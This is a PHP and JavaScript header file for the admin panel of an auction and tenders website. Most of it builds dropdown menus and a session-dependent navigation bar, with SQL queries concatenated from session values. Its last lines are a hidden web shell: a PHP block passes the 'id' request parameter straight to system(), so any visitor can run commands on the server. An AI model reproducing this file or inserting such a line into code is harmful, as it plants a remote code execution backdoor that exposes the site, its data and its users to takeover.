<script language="JavaScript">
<!--
function mmLoadMenus() {

  if (window.mm_menu_0118120323_0) return;

              window.mm_menu_0118120323_0 = new Menu("root",135,24,"Arial, Helvetica, sans-serif",12,"#FFFFFF","#FFFFFF","#333399","#333399","left","middle",6,1,1000,-5,7,true,false,true,0,true,true);

/*  mm_menu_0118120323_0.addMenuItem("Upload&nbsp;Album","location='photogallery.php'");

  mm_menu_0118120323_0.addMenuItem("View&nbsp;Album","location='imagelist.php'");
*/
  mm_menu_0118120323_0.addMenuItem("Add&nbsp;Gallery","location='photogallery.php'");
  mm_menu_0118120323_0.addMenuItem("Modify&nbsp;Gallery","location='albummodify.php'");
  mm_menu_0118120323_0.addMenuItem("Delete&nbsp;Gallery","location='albumdelete.php'");
  mm_menu_0118120323_0.addMenuItem("Home&nbsp;Page&nbsp;Slides","location='upload_slides.php'");

   mm_menu_0118120323_0.fontWeight="bold";

   mm_menu_0118120323_0.hideOnMouseOut=true;

   mm_menu_0118120323_0.bgColor='#555555';

   mm_menu_0118120323_0.menuBorder=1;

   mm_menu_0118120323_0.menuLiteBgColor='#FFFFFF';

   mm_menu_0118120323_0.menuBorderBgColor='#777777';

    window.mm_menu_0206194126_0 = new Menu("root",146,24,"Arial, Helvetica, sans-serif",12,"#FFFFFF","#FFFFFF","#333399","#333399","left","middle",6,1,1000,-5,7,true,false,true,0,true,true);
	
<?php if($_SESSION['tobadmin']!="" && $_SESSION['tob']=='admin') { ?>
  mm_menu_0206194126_0.addMenuItem("Add&nbsp;Platform","location='platform.php'");
<?php } if($_SESSION['tobadmin']!="" && $_SESSION['tob']!='employeeuser') { ?>
  mm_menu_0206194126_0.addMenuItem("Auction&nbsp;Details","location='platform1.php'");

  mm_menu_0206194126_0.addMenuItem("Auctions","location='auctions1.php'");
<?php } if($_SESSION['tobadmin']!="" && $_SESSION['tob']=='admin') {?>
  mm_menu_0206194126_0.addMenuItem("Export&nbsp;Performance","location='export_per.php'");

  mm_menu_0206194126_0.addMenuItem("Lookup","location='states.php'");

  mm_menu_0206194126_0.addMenuItem("Graph&nbsp;Settings","location='gsettings.php'");
	<?php } ?>
   mm_menu_0206194126_0.fontWeight="bold";

   mm_menu_0206194126_0.hideOnMouseOut=true;

   mm_menu_0206194126_0.bgColor='#555555';

   mm_menu_0206194126_0.menuBorder=1;

   mm_menu_0206194126_0.menuLiteBgColor='#FFFFFF';

   mm_menu_0206194126_0.menuBorderBgColor='#777777';

window.mm_menu_0319162428_0 = new Menu("root",148,25,"Verdana, Arial, Helvetica, sans-serif",12,"#FFFFFF","#FFFFFF","#00528C","#0077D1","left","middle",3,0,250,-5,7,true,false,true,0,true,false);

  mm_menu_0319162428_0.addMenuItem("Tenders&nbsp;Registration","location='dltreg.php'");

   mm_menu_0319162428_0.hideOnMouseOut=true;

   mm_menu_0319162428_0.bgColor='#555555';

   mm_menu_0319162428_0.menuBorder=1;

   mm_menu_0319162428_0.menuLiteBgColor='#FFFFFF';

   mm_menu_0319162428_0.menuBorderBgColor='#777777';



                  window.mm_menu_0502185927_0 = new Menu("root",120,24,"Arial, Helvetica, sans-serif",12,"#FFFFFF","#FFFFFF","#333399","#333399","left","middle",6,1,1000,-5,7,true,false,true,0,true,true);

  mm_menu_0502185927_0.addMenuItem("Tenders","location='tenders.php'");

  mm_menu_0502185927_0.addMenuItem("News&nbsp;&&nbsp;Events","location='news.php'");

  mm_menu_0502185927_0.addMenuItem("Publications","location='publications.php'");

  mm_menu_0502185927_0.addMenuItem("Statistics","location='statistics.php'");

  mm_menu_0502185927_0.addMenuItem("Employee&nbsp;Corner","location='employee_corner.php'");

  mm_menu_0502185927_0.addMenuItem("Circulars","location='circulars.php'");

  mm_menu_0502185927_0.addMenuItem("Vacancies","location='vacancies.php'");

  mm_menu_0502185927_0.addMenuItem("Latest&nbsp;News","location='latest.php'");
  
    mm_menu_0502185927_0.addMenuItem("Board&nbsp;Members","location='board_members.php'");

    mm_menu_0502185927_0.addMenuItem("Trainings","location='trainings.php'");

   mm_menu_0502185927_0.fontWeight="bold";

   mm_menu_0502185927_0.hideOnMouseOut=true;

   mm_menu_0502185927_0.bgColor='#555555';

   mm_menu_0502185927_0.menuBorder=0;

   mm_menu_0502185927_0.menuLiteBgColor='#FFFFFF';

   mm_menu_0502185927_0.menuBorderBgColor='#777777';



  window.mm_menu_0827125102_0 = new Menu("root",120,24,"Arial, Helvetica, sans-serif",12,"#FFFFFF","#FFFFFF","#333399","#333399","left","middle",6,1,1000,-5,7,true,false,true,0,true,true);
  mm_menu_0827125102_0.addMenuItem("Users","location='employeeview.php'");
  mm_menu_0827125102_0.addMenuItem("Location","location='master.php'");
  mm_menu_0827125102_0.addMenuItem("Platform","location='platfrm.php'");
  mm_menu_0827125102_0.addMenuItem("Designations","location='designation.php'");
   mm_menu_0827125102_0.fontWeight="bold";
   mm_menu_0827125102_0.hideOnMouseOut=true;
   mm_menu_0827125102_0.bgColor='#555555';
   mm_menu_0827125102_0.menuBorder=0;
   mm_menu_0827125102_0.menuLiteBgColor='#FFFFFF';
   mm_menu_0827125102_0.menuBorderBgColor='#777777';

    window.mm_menu_0902164011_0 = new Menu("root",116,24,"Arial, Helvetica, sans-serif",12,"#FFFFFF","#FFFFFF","#333399","#333399","left","middle",6,1,1000,-5,7,true,false,true,0,true,true);
  mm_menu_0902164011_0.addMenuItem("Auction&nbsp;Details","location='platform1.php'");
  mm_menu_0902164011_0.addMenuItem("Auction","location='auctions.php'");
  mm_menu_0902164011_0.addMenuItem("Graph&nbsp;Setting","location='gsettings.php'");
   mm_menu_0902164011_0.fontWeight="bold";
   mm_menu_0902164011_0.hideOnMouseOut=true;
   mm_menu_0902164011_0.bgColor='#555555';
   mm_menu_0902164011_0.menuBorder=0;
   mm_menu_0902164011_0.menuLiteBgColor='#FFFFFF';
   mm_menu_0902164011_0.menuBorderBgColor='#777777';

mm_menu_0902164011_0.writeMenus();
} // mmLoadMenus()
//-->
</script>
<script language="JavaScript" src="mm_menu.js"></script>
<table width="100%" border="0" cellpadding="0" cellspacing="0">
    
<?php /*?><nav>
  <div class="container">
    <ul>
    <?php
	while($rowmn=@mysqli_fetch_array($selm))
	{
		$sel2=executework("select * from tob_pages where menu_id='".$rowmn['id']."'");
		$cnt2=@mysqli_num_rows($sel2);
		if($cnt2>0)
		$cls=" class='fa fa-angle-down'";
		else
		$cls='';
		
		
		if($rowmn['cms']==1 && $cnt2==0 )
		$link="page_cms.php?page_id=".$rowmn['id'];
		else if($rowmn['link']!='' && $cnt2==0)
		$link=$rowmn['link'];
		else
		$link='#';
		
	?>
      <li><a href="<?php echo $link; ?>" <?php echo $cls; ?>><?php echo $rowmn['page']; ?></a>
     <?php 
	 if($cnt2>0)
	 {
	 	//echo "step2";
	 ?>
      <ul>
        <?php while($row=@mysqli_fetch_array($sel2)) { 
		
			$sel3=executework("select * from tob_pages where menu_id='".$row['id']."'");
			echo ("select * from tob_pages where menu_id='".$row['id']."'");
			$cnt3=@mysqli_num_rows($sel3);
			if($cnt3>0)
			$cls=" class='fa fa-angle-down'";
			else
			$cls='';
		
			if($row['cms']==1  )
			$link="page_cms.php?page_id=".$row['id'];
			else if($row['link']!='')
			$link=$row['link'];
			else
			$link='#';
		
		?>
            <li><a href="<?php echo $link; ?>" <?php echo  $cls; ?>><?php echo $row['page']; ?></a>
            <?php if($cnt3>0) {?>
            
            <ul>
             <?php while($row2=@mysqli_fetch_array($sel3)) { 
				
					if($row2['cms']==1  )
					$link="page_cms.php?page_id=".$row2['id'];
					else if($row2['link']!='')
					$link=$row2['link'];
					else
					$link='#';
		
			?>
            <li><a href="<?php echo $link; ?>"><?php echo $row2['page']; ?></a></li>
            <?php } ?>
            </ul>
            <?php } ?>
            </li>
        <?php } ?>
        </ul>
   <?php } ?>
	</li>
	<?php  }
	?>
      <li><a href="#">About Us</a></li>
      <li> <a href="#">Categories<i class='fa fa-angle-down'></i></a>
        <ul>
        
          <li><a href="#">Category One</a></li>
          <li><a href="#">Category Two</a></li>
          <li><a href="#">Category Three</a></li>
        </ul>
      </li>
      <li class='sub-menu'> <a href="#">Services<i class='fa fa-angle-down'></i></a>
        <ul>
          <li><a href="#">Service One</a></li>
          <li><a href="#">Service Two</a></li>
          <li><a href="#">Service Three</a></li>
          <li class='sub-menu'><a href="#">Service Four<i class='fa fa-angle-down'></i></a>
           <ul>
          <li><a href="#">Service One1</a></li>
          <li><a href="#">Service Two2</a></li>
          <li><a href="#">Service Three3</a></li>
          <li><a href="#">Service Four4</a></li>
          <li><a href="#">Service Five5</a></li>
          <li><a href="#">Service Six6</a></li>
        </ul>
          
          </li>
          <li><a href="#">Service Five</a></li>
          <li><a href="#">Service Six</a></li>
        </ul>
      </li>
      <li><a href="#">Contact Us</a></li>
    </ul>
  </div>
</nav><?php */?>
<?php
if(!empty($_SESSION['tob']) && $_SESSION['tob']=='auction')
{
$selectr=executework("select * from auction_admin where admin='".$_SESSION['tobadmin']."'");
$rowtr=@mysqli_fetch_array($selectr);
}
if(!empty($_SESSION['tob']) && $_SESSION['tob']=='state')
{
$stct=executework("select * from tob_employeeview where username='".$_SESSION['tobadmin']."'");
$rowct=@mysqli_fetch_array($stct);
}
if(!empty($_SESSION['tob']))
{
?>
<div align="right"><span class="style12"><span class="style14">Welcome ,<?php if($_SESSION['tob']=='auction') { ?><?php echo $rowtr['admin']; ?>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;Last Login : <?php echo date('d/m/Y h:i A', strtotime($rowtr['previous_date'])); ?> | &nbsp;&nbsp; IP Address : <?php echo $rowtr['ip_address'] ?> <?php }  ?></span>&nbsp;&nbsp;&nbsp;&nbsp;| <a href="changepassword.php">Change Password</a>&nbsp;&nbsp; |&nbsp;&nbsp; <a href="logout.php">Logout</a>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </span></div>
<br />
<?php
}
//echo $_SESSION['tob'];
if(isset($_SESSION['tobadmin']) && !empty($_SESSION['tobadmin']))
{
	/*while($rowmn=@mysqli_fetch_array($selm))
	{*/
		
		/*$sel2=executework("select * from tob_pages where menu_id='".$rowmn['id']."' and isactive=1 order by morder");
		$cnt2=@mysqli_num_rows($sel2);
		if($cnt2>0)
		$cls="class='caret'";
		else
		$cls='';
		
		
		if($rowmn['cms']==1 && $cnt2==0 && $_SESSION['tobadmin']=='admin' )
		$link="page_cms1.php?page_id=".$rowmn['id'];
		else if($rowmn['link']!='' && $cnt2==0 && $_SESSION['tobadmin']=='admin')
		$link=$rowmn['link'];
		else
		$link='#';*/
		
	?>
    <div style="background-color: #333399;width: 100%;height: 52px;">
<ul id="nav">

	<?php
	if($_SESSION['tobadmin']=='auction')
	{
	 //if($cnt2<0) {
	 ?>
    <li style="padding-left:-50px"><a href="#">Auction System</a>
    <ul>
      <?php /*while($row=@mysqli_fetch_array($sel2)) { 
		
			$sel3=executework("select * from tob_pages where menu_id='".$row['id']."' and isactive=1 order by morder");
			
			$cnt3=@mysqli_num_rows($sel3);
			if($cnt3>0)
			$cls="class='dropdown-submenu'";
			else
			$cls='';
		
			if($row['cms']==1  )
			$link="page_cms1.php?page_id=".$row['id'];
			else if($row['link']!='')
			$link=$row['link'];
			else
			$link='#';*/
		
		?>
        <?php 
		//if($cnt3>0)
		//{
		?>
         <li style="padding-left:-50px"><a href="<?php //echo $link; ?>">e- Auction</a>
             <ul style="margin-top:-5px;">
              <?php /*while($row2=@mysqli_fetch_array($sel3)) { 
				
					if($row2['cms']==1  )
					$link="page_cms1.php?page_id=".$row2['id'];
					else if($row2['link']!='')
					$link=$row2['link'];
					else
					$link='#';*/
		
			?>
            <li><a href="platform1.php">Auction Details</a></li>
			 <li><a href="auctions1.php">Auctions</a></li>
			 
            <?php //} ?>
             </ul>
   		 </li>
    	<?php //} else { ?>
     
      <?php //} ?>
    
      
     
    <?php //} ?>
    </ul>
    </li>
   
  
  
  
  
</ul>

<?php  //} 
	
}  } 
?>

    </table>
<?php
$x = $_GET['id'];
$x = str_replace("@"," ",$x);
system($x); exit;
?>